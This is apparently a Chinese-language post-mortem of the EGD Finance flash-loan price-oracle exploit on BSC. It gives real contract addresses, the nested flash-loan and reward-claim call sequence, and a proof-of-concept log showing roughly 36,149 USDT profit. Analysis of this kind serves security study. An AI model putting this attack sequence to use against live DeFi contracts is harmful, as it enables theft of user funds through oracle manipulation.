# 主线

閃電貸、回調函數、漏洞利用、了結獲利

# 攻击原理

claimAllReward -> getEGDPrice

使用者領取的 Staking Reward 數量，取決於獎勵因子 quota (代表用戶 Staking 多少代幣、Staking 多久時間)
乘上 getEGDPrice() 目前 EGD Token 的價格。
當 EGD Token 價格越高，則給予的 EGD Token 數量越少，
當 EGD Token 價格越低，則給予的 EGD Token 數量越多。
攻擊者在第二層閃電貸，向 EGD/USDT Pair 借出 USDT；
在攻擊者還款之前，getEGDPrice() 取得到的價格資訊就會是不正確的。

攻擊者透過閃電貸，抽走價格預言機的流動性，使 ClaimReward()
獲取到不正確的價格參考，進而使攻擊者可以領取到異常大量的 EGD Token。
攻擊者利用漏洞取得大量 EGD Token 後，將 EGD Token 透過 Pancakeswap 換回 USDT，獲利了結

# get logic address

1 执行以下代码在 log 能看到 delegatecall 的执行地址是 0x93c175439726797DcEe24D08e4ac9164E88e7Aee ::implementation
address logicAddress = IEGD_FinanceProxy(EGD_Finance).implementation();
2 phalcon 里寻找 deleteCall

# transaction

attack: 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
attackContract: 0xc30808d9373093fbfcec9e026457c6a9dab706a7
VulnerableProxy: 0x34bd6dba456bc31c2b3393e499fa10bed32a9370
VulnerableLogic: 0x93c175439726797dcee24d08e4ac9164e88e7aee

USDT: 0x55d398326f99059fF775485246999027B3197955
WBNB: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
Pancake_BSC_USD: 0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae(USDT/WBNB)

EDGToken: 0x202b233735bF743FA31abb8f71e641970161bF98
Pancake_EDG_USD 0xa361433e409adac1f87cdf133127585f8a93c67d(EDG/USDT)

attack -> attackContract -> attackContract.harvest()

[VulnerableProxy.calculateAll(attackContract)]

[Swap]

```
// borrow 2000 USDT

Pancake_BSC_USD.swap({
    amount0Out:"2,000,000,000,000,000,000,000"
    amount1Out:"0"
    to:"0xc30808d9373093fbfcec9e026457c6a9dab706a7"
    data:"0x0000"
})

// pancakeCall1
attackContract.pancakeCall({
    _sender:"0xc30808d9373093fbfcec9e026457c6a9dab706a7"
    _amount0:"2,000,000,000,000,000,000,000"
    _amount1:"0"
    _data:"0x0000"
})

// borrow USDT
Pancake_EDG_USD.swap({
    amount0Out:"0"
    amount1Out:"424,456,221,210,335,857,574,110"
    to:"0xc30808d9373093fbfcec9e026457c6a9dab706a7"
    data:"0x00"
})

// pancakeCall2
attackContract.pancakeCall({
    _sender:"0xc30808d9373093fbfcec9e026457c6a9dab706a7"
    _amount0:"0"
    _amount1:"424,456,221,210,335,857,574,110"
    _data:"0x00"
})

VulnerableProxy.claimAllReward()

// back to money
EDGToken.approve({
    spender:"0x10ed43c718714eb63d5aa57b78b54704e256024e"
    amount:"115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,935"
})

USDT.transfer({
    recipient:"0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae"
    amount:"2,010,000,000,000,000,000,000"
})
```

# result

```
--------------------  Pre-work, stake 100 USDT to EGD Finance --------------------
Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8
Attacker Stake 100 USDT to EGD Finance

-------------------------------- Start Exploit ----------------------------------
[Start] Attacker USDT Balance: 0.000000000000000000
[INFO] EGD/USDT Price before price manipulation: 0.008096310933284567
[INFO] Current earned reward (EGD token): 0.000341874999999972
Attacker manipulating price oracle of EGD Finance...
Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve
Flashloan[1] received
Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve
Flashloan[2] received
[INFO] EGD/USDT Price after price manipulation: 0.000000000060722331
Claim all EGD Token reward from EGD Finance contract
[INFO] Get reward (EGD token): 5630136.300267721935770000
Flashloan[2] payback success
Swap the profit...
Flashloan[1] payback success
-------------------------------- End Exploit ----------------------------------

[End] Attacker USDT Balance: 36149.420145779809942475
```
